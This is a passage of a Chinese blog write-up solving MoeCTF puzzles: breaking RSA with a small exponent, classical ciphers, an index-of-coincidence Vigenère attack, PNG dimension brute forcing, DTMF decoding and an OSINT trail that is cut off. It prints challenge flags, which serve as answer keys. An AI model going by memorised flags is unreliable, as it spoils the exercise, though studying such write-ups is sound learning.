class="comment">#moectf&#123;s0_Powwwwwwwwwwwww3r!&#125;</span></span><br></pre></td></tr></table></figure><blockquote><p><em><strong>NumberTheory-MyGrandson</strong></em></p><blockquote><p>其实比较明显，c比n小很多，而且e=3，属于是取模取了个寂寞。<br>而且不敢确定的话可以把c列表打出来看看，每个元素其实都是一样的，也就是说c列表里实际上都是m的三次方。那么我们把c直接开三次方就可以了。<br>不过pow函数有精度问题,所以用gmpy2.iroot开一下。</p></blockquote></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">c=<span class="number">25681920037857462308038008456804236725305902130578298860433144085656782676411434281544156794249690534545397408244321828543334304937398521739382233631303709676426573143503446051379370337969083171791612381925477</span></span><br><span class="line">m=gmpy2.iroot(c,<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#输出：(mpz(2950365559902224967742067902659102097834402066133060751891986702825853), True)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m=<span class="number">2950365559902224967742067902659102097834402066133060751891986702825853</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment">#moectf&#123;Chinese_Remain_Theory&#125;</span></span><br></pre></td></tr></table></figure><h1 id="Classical-Cryptography"><a href="#Classical-Cryptography" class="headerlink" title="Classical Cryptography"></a>Classical Cryptography</h1><blockquote><p><em><strong>Augustine’s Way</strong></em></p><blockquote><p>npfdug{f3tz_Bv9v5u1of!}<br>就是凯撒，直接爆破。<br>moectf{e3sy_Au9u5t1ne!}</p></blockquote></blockquote><blockquote><p><em><strong>OldButPopular</strong></em></p><blockquote><p>凯撒＋栅栏，先凯撒，找首字母是m的，就是要找的字符串。<br>然后用在线网站解不太对，看一下长度发现是38，数一下moectf这几个字符的索引，发现分栏的方式应该是8 8 8 7 7，跟标准的栅栏密码稍微差那么一点 <del>，不然真成白给题了。</del></p></blockquote></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">&quot;mf3n_u31o&#123;rtg7_dec__0_w&#125;c4wt_t0t540ohr&quot;</span></span><br><span class="line">a1=a[:<span class="number">8</span>]</span><br><span class="line">a2=a[<span class="number">8</span>:<span class="number">16</span>]</span><br><span class="line">a3=a[<span class="number">16</span>:<span class="number">24</span>]</span><br><span class="line">a4=a[<span class="number">24</span>:<span class="number">31</span>]</span><br><span class="line">a5=a[<span class="number">31</span>:]</span><br><span class="line">flag=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    flag.append(a1[i])</span><br><span class="line">    flag.append(a2[i])</span><br><span class="line">    flag.append(a3[i])</span><br><span class="line">    <span class="keyword">if</span> i &lt;<span class="number">7</span>:</span><br><span class="line">        flag.append(a4[i])</span><br><span class="line">        flag.append(a5[i])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(i,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">moectf&#123;c453r_w4nt_t0_g0_ou7_th3_w0r1d&#125;</span><br></pre></td></tr></table></figure><blockquote><p><em><strong>Augustine’s Way#2</strong></em></p><blockquote><p>凯撒变式，用ASCII码表做位移，不局限于字母了，所有字符都要位移。</p></blockquote></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cyber=<span class="string">&quot;eg][l^sdm(i)YfWqq\-u&quot;</span></span><br><span class="line">flag=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cyber:</span><br><span class="line">    flag.append(<span class="built_in">ord</span>(i)+<span class="built_in">ord</span>(<span class="string">&#x27;m&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;e&#x27;</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#moectf&#123;lu0q1an_yyd5&#125;</span></span><br></pre></td></tr></table></figure><blockquote><p><em><strong>Ez Vigenere</strong></em></p><blockquote><p>搜一下维吉尼亚，前几个字符对照moectf，可以知道密钥是rxyyds，拿去解密网站解密就好了<br>moectf{the_key_of_vigenere_is_rxyyds}</p></blockquote></blockquote><blockquote><p><em><strong>モンスターを縫う！</strong></em></p><blockquote><p>flag1，一眼凯撒，1位移：   <strong>moectf{cl@</strong><br>flag2，维吉尼亚，密钥给了：  <strong>ssical</strong><br>flag3，栅栏，密钥2：  <strong>_cipher</strong><br>flag4，ABAAA，培根密码：  <strong>I</strong><br>flag4，凯撒，13位移 <del>（我当时忽略那个B了，没想明白是啥意思，后来他们告诉我B拆开就是13······）</del> ：<strong>pr3t</strong><br>flag5，摩斯密码： <strong>tyg00d!｝</strong><br><strong>moectf{cl@ssical_cipherIpr3tyg00d!}</strong></p></blockquote></blockquote><blockquote><p><em><strong>Ex Viginere?</strong></em></p><blockquote><p><del>重头戏终于来了</del><br>这个解密的详细过程在dbt的博客里有，我们只需要把他进行AES解密和base64解密的那一段删掉，然后就可以跑出来明文了。之后根据哈希值逐位爆破，找到flag。<br>简单来讲就是根据重合指数爆破出密钥长度，计算k1和k2，就可以还原明文。在足够长的英文文本中，每个字母出现的频率有一个确定的值，重合指数就是根据这一统计规律来计算的。<br> ~~可以去看看dbt的博客，讲得可详细了~~~</p></blockquote></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">r&#x27;c.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">c = f.read()</span><br><span class="line">f.close()</span><br><span class="line"><span class="comment"># 我们已经知道，维吉尼亚密码可以被分解为若干组平移密码来破译，</span></span><br><span class="line"><span class="comment"># 而一个明文足够长的平移密码的重合指数接近 0.0687。</span></span><br><span class="line"><span class="comment"># 换言之，如果我们选取某个 l 值，使得分组后的密文的重合指数接近 0.065，</span></span><br><span class="line"><span class="comment"># 则说明选取的 t 值与密钥的长度是一致的。</span></span><br><span class="line">best_index = <span class="number">0.065</span></span><br><span class="line"><span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">dic_index = &#123;<span class="string">&#x27;a&#x27;</span>: <span class="number">0.08167</span>,<span class="string">&#x27;b&#x27;</span>: <span class="number">0.01492</span>,<span class="string">&#x27;c&#x27;</span>: <span class="number">0.02782</span>,<span class="string">&#x27;d&#x27;</span>:<span class="number">0.04253</span>,<span class="string">&#x27;e&#x27;</span>: <span class="number">0.12702</span>,<span class="string">&#x27;f&#x27;</span>:<span class="number">0.02228</span>,<span class="string">&#x27;g&#x27;</span>: <span class="number">0.02015</span>,<span class="string">&#x27;h&#x27;</span>:<span class="number">0.06094</span>,<span class="string">&#x27;i&#x27;</span>:<span class="number">0.06966</span>,<span class="string">&#x27;j&#x27;</span>:<span class="number">0.00153</span>,<span class="string">&#x27;k&#x27;</span>:<span class="number">0.00772</span>,<span class="string">&#x27;l&#x27;</span>:<span class="number">0.04025</span>,<span class="string">&#x27;m&#x27;</span>:<span class="number">0.02406</span>,<span class="string">&#x27;n&#x27;</span>:<span class="number">0.06749</span>,<span class="string">&#x27;o&#x27;</span>:<span class="number">0.07507</span>,<span class="string">&#x27;p&#x27;</span>:<span class="number">0.01929</span>,<span class="string">&#x27;q&#x27;</span>:<span class="number">0.00095</span>,<span class="string">&#x27;r&#x27;</span>:<span class="number">0.05987</span>,<span class="string">&#x27;s&#x27;</span>:<span class="number">0.06327</span>,<span class="string">&#x27;t&#x27;</span>:<span class="number">0.09056</span>,<span class="string">&#x27;u&#x27;</span>:<span class="number">0.02758</span>,<span class="string">&#x27;v&#x27;</span>:<span class="number">0.00978</span>,<span class="string">&#x27;w&#x27;</span>:<span class="number">0.02360</span>,<span class="string">&#x27;x&#x27;</span>:<span class="number">0.00150</span>,<span class="string">&#x27;y&#x27;</span>:<span class="number">0.01974</span>,<span class="string">&#x27;z&#x27;</span>:<span class="number">0.00074</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">IndCo</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="comment"># 计算字符串的重合指数（所有字母出现频率的平方和）</span></span><br><span class="line">    <span class="comment"># 输入 s </span></span><br><span class="line">    <span class="comment"># 输出 重合指数</span></span><br><span class="line">    alpha = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line">    freq = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> alpha:</span><br><span class="line">        freq[i] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        freq[i] =  freq[i] + <span class="number">1</span></span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> alpha:</span><br><span class="line">        index = index + (freq[i]*(freq[i] - <span class="number">1</span> )) / (<span class="built_in">len</span>(s) * (<span class="built_in">len</span>(s) - <span class="number">1</span> ))</span><br><span class="line">    <span class="keyword">return</span> index</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">IndCo_m</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="comment"># 计算明文 s 中的各字母频率和英文字母中的频率吻合程度</span></span><br><span class="line">    <span class="comment"># 输入：明文 s</span></span><br><span class="line">    <span class="comment"># 输出：吻合程度</span></span><br><span class="line">    alpha = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line">    freq = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> alpha:</span><br><span class="line">        freq[i] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        freq[i] += <span class="number">1</span></span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> alpha:</span><br><span class="line">        index += freq[i] / <span class="built_in">len</span>(s) * dic_index[i]</span><br><span class="line">    <span class="keyword">return</span> index</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_keylen</span>(<span class="params">c</span>):</span></span><br><span class="line">    <span class="comment"># 求出最符合统计学的 m,n 的最小公倍数，方法通过爆破足够大的周期样本，观察成倍出现的周期</span></span><br><span class="line">    <span class="comment"># 计算方法是解出每一个子密文段的重合指数然后求平均值 在和最佳重合指数相减 误差小于 0.01</span></span><br><span class="line">    <span class="comment"># 输入：密文</span></span><br><span class="line">    <span class="comment"># 输出：公共周期列表</span></span><br><span class="line">    keylen = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        average_index = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i):</span><br><span class="line">            s = <span class="string">&#x27;&#x27;</span>.join(c[j+i*x] <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(c)//i))</span><br><span class="line">            index = IndCo(s)</span><br><span class="line">            average_index+=index</span><br><span class="line">        average_index = average_index/i - best_index</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">abs</span>(average_index)&lt;<span class="number">0.01</span>:</span><br><span class="line">            keylen.append(i)</span><br><span class="line">    <span class="keyword">return</span> keylen</span><br><span class="line">keylen = get_keylen(c)</span><br><span class="line"><span class="built_in">print</span>(keylen)</span><br><span class="line"><span class="comment">#____________________________得到 keylen_____________________________#</span></span><br><span class="line"><span class="comment">#____________________________爆破 flag———————————————————————————————#</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">c,i,j</span>):</span></span><br><span class="line">    alpha = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line">    m = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> c:</span><br><span class="line">        m += alpha[((alpha.index(x)-j)*gmpy2.invert(i,<span class="number">26</span>))%<span class="number">26</span>]</span><br><span class="line">    <span class="keyword">return</span> m </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_key</span>(<span class="params">c</span>):</span></span><br><span class="line">    <span class="comment"># 得到一个密文段的单个字符 key .i .j</span></span><br><span class="line">    <span class="comment"># 暴力枚举，找到最符合的</span></span><br><span class="line">    <span class="comment"># 输入：密文段</span></span><br><span class="line">    <span class="comment"># 输出：i,j</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">        <span class="keyword">if</span> gmpy2.gcd(i,<span class="number">26</span>)!= <span class="number">1</span> :</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">            m = decrypt(c,i,j)</span><br><span class="line">            index = IndCo_m(m)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">abs</span>(index-<span class="number">0.065</span>)&lt;<span class="number">0.01</span>:</span><br><span class="line">                <span class="keyword">return</span> (i,j)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_all_key</span>(<span class="params">s,keylen</span>):</span></span><br><span class="line">    <span class="comment"># 得到一个周期内所有密文段的 key</span></span><br><span class="line">    <span class="comment"># 输入：原密文，周期</span></span><br><span class="line">    <span class="comment"># 输出：无</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(keylen):</span><br><span class="line">        temps = <span class="string">&#x27;&#x27;</span>.join([s[i+x*keylen] <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(s)//keylen)])</span><br><span class="line">        <span class="built_in">print</span>(get_key(temps))</span><br><span class="line">get_all_key(c,keylen[<span class="number">0</span>])</span><br><span class="line"><span class="comment"># 于是就可以分析得到 ka = []  kb= []</span></span><br><span class="line"><span class="comment"># 例如：(23, 9)(25, 21)(21, 9)(3, 10)(19, 16)(23, 3)(25, 22)(21, 13)(3, 14)(19, 21)(23, 15)(25, 9)(21, 21)(3, 9)(19, 10)(23, 16)(25, 3)(21, 22)(3, 13)(19, 14)(23, 21)(25, 15)(21, 9)(3, 21)(19, 9)(23, 10)(25, 16)(21, 3)(3, 22)(19, 13)(23, 14)(25, 21)(21, 15)(3, 9)(19, 21)(23, 9)(25, 10)(21, 16)(3, 3)(19, 22)(23, 13)(25, 14)(21, 21)(3, 15)(19, 9)(23, 21)(25, 9)(21, 10)(3, 16)(19, 3)(23, 22)(25, 13)(21, 14)(3, 21)(19, 15)</span></span><br><span class="line"><span class="comment"># 那么得到就是 k1=[23,25,21,3,19],k2=[9,21,9,10,16,3,22,13,14,21,15]</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span>*</span><br><span class="line">k1=[<span class="number">9</span>,<span class="number">7</span>,<span class="number">25</span>,<span class="number">11</span>,<span class="number">11</span>,<span class="number">19</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">25</span>,<span class="number">9</span>,<span class="number">7</span>]</span><br><span class="line">k2=[<span class="number">25</span>,<span class="number">19</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">25</span>,<span class="number">20</span>,<span class="number">8</span>]</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">r&#x27;c.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">c = f.read()</span><br><span class="line">f.close()</span><br><span class="line">plaintext = <span class="string">&#x27;&#x27;</span></span><br><span class="line">l1 = <span class="built_in">len</span>(k1)</span><br><span class="line">l2 = <span class="built_in">len</span>(k2)</span><br><span class="line">alpha=<span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">    plaintext+=alpha[((alpha.index(c[i])-k2[i%l2])*gmpy2.invert(k1[i%l1],<span class="number">26</span>))%<span class="number">26</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plaintext)):</span><br><span class="line">    a=plaintext[i:i+<span class="number">16</span>]</span><br><span class="line">    b=a+<span class="string">&#x27;How_Interesting_the_Cryptography_Is&#x27;</span></span><br><span class="line">    <span class="keyword">if</span>(md5(b.encode()).hexdigest()==<span class="string">&#x27;196cf7098c7ea6e3e4d03691fb9d4f58&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(a)</span><br><span class="line"><span class="comment">#moectf&#123;pieceofchocolate&#125;</span></span><br></pre></td></tr></table></figure><hr><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="find-me"><a href="#find-me" class="headerlink" title="find_me"></a><strong>find_me</strong></h2><p>把文件拖进<em><strong>010editor</strong></em> 进行查看，Flag跃然于右边的文本(之前都用的winhex,没想到<em><strong>010edito</strong></em>r又经济又实惠，hs yyds)</p><p><code>moectf&#123;hs_g1v3_u_fl@g&#125;</code></p><h2 id="Macross"><a href="#Macross" class="headerlink" title="Macross"></a><strong>Macross</strong></h2><p>打开是一个以<strong>mrf</strong>为后缀名的文件，用百度搜了很久一直说是和mac系统相关连的文件格式，然后下了<em>Fileview</em>查看，看了个寂寞，<del>只有我浪费了精力和希望，百度得了流量</del> 然后上 Google 搜到是记录鼠标行为的数据文件(<em>An MRF file is a data file created by Bartels Media Mouse Recorder</em>)，并找到下载相应的软件<code>MacrossRecorder</code>，然后打开 Windows 画图，运行文件并记录轨迹</p><p><code>moectf&#123;Rec0rder_15_Funny&#125;</code></p><h2 id="Homework"><a href="#Homework" class="headerlink" title="Homework"></a><strong>Homework</strong></h2><p>大致按照word隐写的流程走一下，将字体全调成红色，发现有一处有重叠的字符，直接复制然后找一个文本框得出<code>flag&#123;0h_U_</code>，调整阅读视图或者在kali中打开发现了<code>f1nd_m3!&#125;</code>的文本(或者清除格式也能看到),最终得到Flag</p><p><img src="https://i.loli.net/2021/09/24/9OfBvmqDg6GWrHe.png" alt="image-20210924151122930"></p><p><img src="https://i.loli.net/2021/09/24/KysmEInGoabUqVM.png"></p><p><code>moectf&#123;0h_U_f1nd_m3!&#125;</code></p><h2 id="flipflipflip"><a href="#flipflipflip" class="headerlink" title="flipflipflip"></a><strong>flipflipflip</strong></h2><p>打开文件发现末尾是<code>=</code>，可能用到了base64编码，因文件较大，复制粘贴会卡，选用python做题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;task&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">content = f.read()</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>对content第一次解码，查看头尾</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">content = base64.decodebytes(content)</span><br><span class="line"><span class="built_in">print</span>(content[:<span class="number">10</span>])  <span class="comment"># b&#x27;=0DME1URxU&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(content[-<span class="number">10</span>:-<span class="number">1</span>])  <span class="comment"># b&#x27;XRXl1V41m&#x27;</span></span><br></pre></td></tr></table></figure><p>发现=变到了前方，需要进行翻转字符串，<font color='red'>如果此时继续编码则会报错</font></p><p>所以思路出来了：不断编码，报错就翻转再编码，直至出现moe为止</p><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = base64.decodebytes(content)</span><br><span class="line">        data.decode(<span class="string">&#x27;utf-8&#x27;</span>) <span class="comment">#注意要进行解码</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        data = base64.decodebytes(content[::-<span class="number">1</span>])</span><br><span class="line">        data.,decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;moe&#x27;</span> <span class="keyword">in</span> data:</span><br><span class="line">        <span class="built_in">print</span>(data)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    content = data</span><br><span class="line">    <span class="comment">#b&#x27;moectf&#123;fffffflipppppp&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><code>moectf&#123;fffffflipppppp&#125;</code></p><h2 id="White-Album"><a href="#White-Album" class="headerlink" title="White Album"></a><strong>White Album</strong></h2><p>参考博客：</p><blockquote><p><a href="">https://www.notion.so/MoeCTF-readme-txt-487c4f5e93764867b7aeead6a263c4ba#b8c0d9633d0e4bfe89ccd0fdb0f2672f</a></p></blockquote><p>打开可以看到<code>.png</code> ，用kali打开图片，打不开（白屏），网上搜了一下，是图片宽高的问题，CRC爆破出原宽高(找到的脚本)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&#x27;test.png&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    all_b = f.read()</span><br><span class="line">    crc32key = <span class="built_in">int</span>(all_b[<span class="number">29</span>:<span class="number">33</span>].<span class="built_in">hex</span>(),<span class="number">16</span>)</span><br><span class="line">    data = <span class="built_in">bytearray</span>(all_b[<span class="number">12</span>:<span class="number">29</span>])</span><br><span class="line">    n = <span class="number">4095</span>            <span class="comment">#理论上0xffffffff,但考虑到屏幕实际/cpu，0x0fff就差不多了</span></span><br><span class="line">    <span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(n):          <span class="comment">#高和宽一起爆破</span></span><br><span class="line">        width = <span class="built_in">bytearray</span>(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, w))     <span class="comment">#q为8字节，i为4字节，h为2字节</span></span><br><span class="line">        <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            height = <span class="built_in">bytearray</span>(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, h))</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                data[x+<span class="number">4</span>] = width[x]</span><br><span class="line">                data[x+<span class="number">8</span>] = height[x]</span><br><span class="line">            crc32result = zlib.crc32(data)</span><br><span class="line">            <span class="keyword">if</span> crc32result == crc32key:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;宽为：&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(width)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;高为：&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(height)</span><br><span class="line">                exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>然后在<code>010 Editor</code> 里改它的宽高部分，得到完整图片，出现条码拿到在线二维码网站解码(后面得知是<code>PDF417</code>  介于二维码和条形码的一种码)</p><p><img src="https://i.loli.net/2021/09/24/dvfwjZUOKyClDWR.png"></p><blockquote><p>推荐网站： <a href="https://jiema.wwei.cn/">https://jiema.wwei.cn</a></p></blockquote><p><code>moectf&#123;WhY_@r3_u_s0_5K1ll3D&#125;</code></p><h2 id="Phone-Call"><a href="#Phone-Call" class="headerlink" title="Phone Call"></a><strong>Phone Call</strong></h2><p>参考博客<a href="https://www.zhihu.com/question/19780683">https://www.zhihu.com/question/19780683</a><br>这种题一就很复杂，拿到<code>audacity</code>看到将近21个峰</p><p><img src="https://i.loli.net/2021/09/24/8nzZTmi7hAcKkvM.png"></p><p>然后偶然发现一个网站，就起飞，嘿嘿嘿(<em>咱没有手撕能力</em>)</p><blockquote><p><a href="http://dialabc.com/sound/detect/index.html">http://dialabc.com/sound/detect/index.html</a></p></blockquote><p>再根据<code>audacity</code>给的间隔设置间隔符号就sucess了</p><p><img src="https://i.loli.net/2021/09/24/cSpaHYQn8R2DEgZ.png"></p><p><code>moectf&#123;114514-1919810-7738-9634&#125;</code></p><h2 id="社工题"><a href="#社工题" class="headerlink" title="社工题"></a><strong>社工题</strong></h2><p>Bing或者Google搜索<code>Noah的博客</code></p><p>先找到这个：<a href="https://noahtie.github.io/about/">About NoahBox | NoahBox (noahtie.github.io)</a>，点击签订契约转到第二个</p><p>第二个：<a href="https://masternoah.lofter.com/">诺亚城主 (lofter.com)</a>，点击上面的i，到第三个</p><p>第三个：<a 